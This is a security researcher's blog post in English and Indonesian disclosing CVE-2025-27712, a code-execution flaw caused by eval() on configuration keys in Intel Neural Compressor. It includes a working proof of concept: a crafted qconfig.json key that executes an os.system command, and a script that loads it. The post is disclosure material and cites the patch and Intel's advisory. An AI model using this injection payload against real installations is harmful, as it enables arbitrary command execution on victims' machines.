<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>Intel Neural Compressor Privilege Escalation via eval() in load_config_mapping</title>
<meta name="author" content="Muhammad Fadilullah Dzaki (@0xboyz)" />
<link rel="icon" type="image/png" href="favicon.png" />

<style>
/* Dark hacker style */
:root{
  --bg: #0b0f12;
  --panel: #071018;
  --muted: #84a0a8;
  --text: #cfe8e8;
  --accent: #ffffff;
  --accent-2: #7adfff;
  --danger: #ff6b6b;
  --mono: "Fira Code", "JetBrains Mono", ui-monospace, SFMono-Regular, Menlo, Monaco, "Roboto Mono", monospace;
  --glass: rgba(255,255,255,0.02);
  --glass-border: rgba(255,255,255,0.04);
}

html,body{
  height:100%;
  margin:0;
  background:linear-gradient(180deg,#050607 0%, #081215 100%);
  color:var(--text);
  font-family:Inter, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
}

header{
  position:fixed;
  left:0;
  right:0;
  top:0;
  display:flex;
  align-items:center;
  justify-content:space-between;
  padding:14px 22px;
  backdrop-filter: blur(6px);
  z-index:1000
}

.topbar {
  width:100%;
  display:flex;
  align-items:center;
  justify-content:space-between;
  gap:12px
}

.brand {
  font-family:var(--mono);
  color:var(--accent);
  font-weight:700;
  letter-spacing:1px
}

.navlinks {
  display:flex;
  gap:10px
}

.navlinks a{
  color:var(--muted);
  text-decoration:none;
  padding:8px 12px;
  border-radius:8px;
  border:1px solid var(--glass-border);
  background:var(--glass);
  font-size:0.95rem;
  position:relative;
  overflow:hidden
}

.navlinks a:hover{
  color:var(--accent-2);
  transform:translateY(-2px)
}

/* Home button animation */
.navlinks a.home::before{
  content: "";
  position: absolute;
  left: -28px;
  top: 50%;
  transform: translateY(-50%) scale(0.9);
  font-size:18px;
  opacity: 0.8;
  filter: drop-shadow(0 2px 2px rgba(0,0,0,0.6));
  animation: fly-across 3.2s linear infinite;
  pointer-events: none;
}

@keyframes fly-across{
  0% { left: -28px; transform: translateY(-18%) rotate(-20deg) scale(0.9); opacity:0; }
  8% { left: 6%; transform: translateY(-28%) rotate(-6deg) scale(1); opacity:1; }
  40% { left: 42%; transform: translateY(-50%) rotate(6deg) scale(1); opacity:0.95; }
  75% { left: 86%; transform: translateY(-42%) rotate(10deg) scale(0.95); opacity:0.6; }
  100% { left: 110%; transform: translateY(-50%) rotate(20deg) scale(0.9); opacity:0; }
}

main{
  max-width:980px;
  margin:110px auto 80px;
  padding:0 20px
}

.post{
  background:linear-gradient(180deg, rgba(10,14,16,0.7), rgba(6,10,12,0.8));
  border:1px solid rgba(255,255,255,0.03);
  border-radius:12px;
  padding:28px;
  box-shadow: 0 10px 40px rgba(3,8,12,0.8)
}

h1{
  margin:0 0 8px 0;
  font-size:1.6rem;
  color:var(--accent)
}

.meta{
  color:var(--muted);
  margin:8px 0 14px 0
}

h2{
  color:var(--accent-2);
  margin:18px 0 8px 0;
  font-size:1.05rem
}

p, li{
  color:var(--text);
  font-size:1rem;
  line-height:1.7;
  margin:0 0 12px 0
}

pre.code{
  background:#021014;
  color:#dff;
  padding:14px;
  border-radius:8px;
  overflow:auto;
  border:1px solid rgba(255,255,255,0.06);
  font-family:var(--mono);
  font-size:0.92rem;
  line-height:1.45
}

.refs a{
  color:white !important;
  text-decoration:none;
}

.refs a:hover{
  text-decoration:underline;
}

footer{
  color:var(--muted);
  font-size:0.9rem;
  text-align:center;
  margin-top:18px
}

.lang-toggle{
  position:fixed;
  bottom:20px;
  left:20px;
  z-index:1001;
  padding:9px 12px;
  border-radius:8px;
  border:1px solid rgba(255,255,255,0.04);
  background:transparent;
  color:var(--accent);
  font-family:var(--mono);
  cursor:pointer
}
</style>
</head>

<body>

<header>
  <div class="topbar">
    <div class="brand">0xboyz</div>
    <nav class="navlinks">
      <a class="home" href="#" aria-label="Home">Home</a>
      <a href="#" aria-label="Blog">Blog</a>
      <a href="#" target="_blank">GitHub</a>
    </nav>
  </div>
</header>

<main>

<!-- ================= ENGLISH VERSION ================= -->
<article id="en" class="post" style="display:block">

<h1>Privilege Escalation in Intel Neural Compressor via eval() CVE-2025-27712</h1>
<div class="meta">Written by Muhammad Fadilullah Dzaki (@0xboyz)</div>

<h2>Story</h2>
<p>
It was past midnight when I found myself drifting through the internals of Intel’s Neural Compressor. The room was quiet, the only sound the soft hum of my laptop’s fan struggling against the weight of countless repositories I had open. I wasn’t searching for trouble. All I wanted was to understand how this framework handled model configuration. Something simple. Something harmless.
</p>
<p>
But the universe has a habit of placing small anomalies in your path when you least expect them. A function name caught my eye inside the load_config_mapping implementation. It felt ordinary at first glance. A utility function meant to map configuration keys. Straightforward. Routine.
</p>
<p>
Then I saw it. eval().
</p>
<p>
In that quiet moment, everything around me froze. My fingers hovered above the keyboard. The presence of eval in a function that processed user-supplied configuration data wasn’t just a misstep. It was an invitation. A silent door left ajar. A place where anything crafted carefully enough could slip through and execute in the heart of the system.
</p>
<p>
I read the line again. And again. And every time, the weight of it became clearer. If someone slipped malicious code inside qconfig.json, the framework would execute it without hesitation. No warnings. No barriers. Just blind trust.
</p>
<p>
That was all it took for the story to change. What began as a casual evening code read turned into a path that revealed a full Privilege Escalation vulnerability. A weakness hidden not in some obscure binary, but right in a JSON configuration parser trusted by countless developers.
</p>

<h2>Root Cause</h2>
<p>
At the heart of the issue lies the use of eval on keys loaded directly from user-supplied JSON files. It means that any string placed as a key will be interpreted and executed as Python code.
</p>

<p>Direct reference to vulnerable code:</p>

<div class="refs">
<ul>
<li><a href="https://github.com/intel/neural-compressor/blob/v2.5/neural_compressor/common/utils/save_load.py#L54" target="_blank">https://github.com/intel/neural-compressor/blob/v2.5/neural_compressor/common/utils/save_load.py#L54</a></li>
</ul>
</div>

<h2>Proof of Concept (PoC)</h2>

<p>1. Install Intel Neural Compressor:  
<code>pip install neural-compressor</code></p>

<p>2. Run configuration script (<strong>config.py</strong>):</p>

<pre class="code">
import torch
from torchvision.models import resnet18
from neural_compressor.torch.quantization import prepare, convert, RTNConfig

model = resnet18(pretrained=True)
quant_config = RTNConfig()
model = prepare(model, quant_config)
model = convert(model)
model.save("saved_results")
</pre>

<p>3. Replace saved_results/qconfig.json with payload:</p>

<pre class="code">
{
  "('dummy_op', import('os').system('touch /tmp/soloplayer'))": {
    "default": {
      "some_key": "some_value"
    }
  }
}
</pre>

<p>4. Run exploit script (<strong>exploit.py</strong>):</p>

<pre class="code">
import os
from torchvision.models import resnet18
from neural_compressor.torch.quantization import load

orig_model = resnet18(pretrained=True)
print("[*] Loading model with malicious qconfig.json...")
_ = load("saved_results", original_model=orig_model)
</pre>

<p>5. Verify created file:</p>

<pre class="code">
ls -l /tmp/soloplayer
</pre>

<h2>Impact</h2>
<p>
This vulnerability enables full arbitrary command execution, allowing attackers to run system-level commands simply by tricking the framework into loading a malicious qconfig.json file.
</p>

<h2>References</h2>
<div class="refs">
<ul>
<li><a href="https://github.com/intel/neural-compressor/commit/6718923c4061d8d2cdf82ab9fa1e9691675cf7f4" target="_blank">Intel Neural Compressor Patch Commit</a></li>
<li><a href="https://www.intel.com/content/www/us/en/security-center/advisory/intel-sa-01365.html" target="_blank">Intel Security Advisory</a></li>
</ul>
</div>

<footer>© 2025 Muhammad Fadilullah Dzaki (@0xboyz)</footer>
</article>

<!-- ================= INDONESIAN VERSION ================= -->
<article id="id" class="post" style="display:none">

<h1>Privilege Escalation pada Intel Neural Compressor melalui eval() CVE-2025-27712</h1>
<div class="meta">Ditulis oleh Muhammad Fadilullah Dzaki (@0xboyz)</div>

<h2>Cerita</h2>
<p>
Malam itu sunyi ketika saya menelusuri bagian dalam Intel Neural Compressor. Lampu kamar sudah redup, hanya layar laptop yang terus menyala. Awalnya saya hanya ingin memahami bagaimana framework ini memetakan konfigurasi model. Tidak ada misi. Tidak ada rasa curiga. Hanya rasa penasaran biasa.
</p>
<p>
Hingga saya menemukan sebuah fungsi yang tampak sederhana. load_config_mapping. Fungsinya terlihat biasa saja. Mengambil key dari konfigurasi, lalu memetakan nilainya. Seharusnya aman. Seharusnya tidak ada yang spesial.
</p>
<p>
Namun mata saya berhenti pada satu baris. eval().
</p>
<p>
Detik itu juga perasaan saya berubah. Tangan saya terhenti, pikiran saya mulai menerka. Penggunaan eval pada input dari file konfigurasi yang bisa dibuat oleh pengguna bukan hanya kelalaian. Itu adalah celah. Sebuah pintu yang dibiarkan terbuka cukup lebar bagi siapa saja yang ingin melangkah masuk tanpa izin.
</p>
<p>
Baris kode itu memproses key JSON langsung sebagai Python code. Artinya jika seseorang memasukkan payload berbahaya ke dalam qconfig.json, perintah itu akan dijalankan oleh sistem tanpa penolakan sedikit pun.
</p>
<p>
Momen sederhana itu menjadi titik awal ditemukannya kerentanan Privilege Escalation yang sepenuhnya dapat dieksploitasi. Sebuah bug yang tersembunyi bukan di binary obscure, tetapi di parser JSON yang dipercaya banyak developer.
</p>

<h2>Akar Masalah</h2>

<p>
Masalah inti berasal dari penggunaan eval pada key yang berasal dari file konfigurasi buatan pengguna. Setiap string yang ada dalam key dieksekusi sebagai kode Python.
</p>

<p>Referensi langsung ke kode rentan:</p>

<div class="refs">
<ul>
<li><a href="https://github.com/intel/neural-compressor/blob/v2.5/neural_compressor/common/utils/save_load.py#L54" target="_blank">https://github.com/intel/neural-compressor/blob/v2.5/neural_compressor/common/utils/save_load.py#L54</a></li>
</ul>
</div>

<h2>Proof of Concept (PoC)</h2>

<p>1. Install Intel Neural Compressor:  
<code>pip install neural-compressor</code></p>

<p>2. Jalankan script konfigurasi (<strong>config.py</strong>):</p>

<pre class="code">
import torch
from torchvision.models import resnet18
from neural_compressor.torch.quantization import prepare, convert, RTNConfig

model = resnet18(pretrained=True)
quant_config = RTNConfig()
model = prepare(model, quant_config)
model = convert(model)
model.save("saved_results")
</pre>

<p>3. Ganti file qconfig.json dengan payload berikut:</p>

<pre class="code">
{
  "('dummy_op', import('os').system('touch /tmp/soloplayer'))": {
    "default": {
      "some_key": "some_value"
    }
  }
}
</pre>

<p>4. Jalankan script exploit (<strong>exploit.py</strong>):</p>

<pre class="code">
import os
from torchvision.models import resnet18
from neural_compressor.torch.quantization import load

orig_model = resnet18(pretrained=True)
print("[*] Loading model with malicious qconfig.json...")
_ = load("saved_results", original_model=orig_model)
</pre>

<p>5. Cek apakah file berhasil dibuat:</p>

<pre class="code">
ls -l /tmp/soloplayer
</pre>

<h2>Dampak</h2>
<p>
Kerentanan ini memungkinkan eksekusi penuh perintah sistem dengan hanya memuat file qconfig.json yang dimodifikasi. Hal ini dapat menyebabkan kompromi sistem total.
</p>

<h2>Referensi</h2>
<div class="refs">
<ul>
<li><a href="https://github.com/intel/neural-compressor/commit/6718923c4061d8d2cdf82ab9fa1e9691675cf7f4" target="_blank">Commit Patch Intel Neural Compressor</a></li>
<li><a href="https://www.intel.com/content/www/us/en/security-center/advisory/intel-sa-01365.html" target="_blank">Intel Security Advisory</a></li>
</ul>
</div>

<footer>© 2025 Muhammad Fadilullah Dzaki (@0xboyz)</footer>
</article>

</main>

<!-- LANGUAGE SWITCH -->
<button class="lang-toggle" onclick="toggleLang()">EN / ID</button>

<script>
function toggleLang(){
  const en = document.getElementById('en');
  const id = document.getElementById('id');
  if(en.style.display === "none"){
    en.style.display = "block";
    id.style.display = "none";
  } else {
    en.style.display = "none";
    id.style.display = "block";
  }
  window.scrollTo({ top:0, behavior:'smooth' });
}
</script>

</body>
</html>
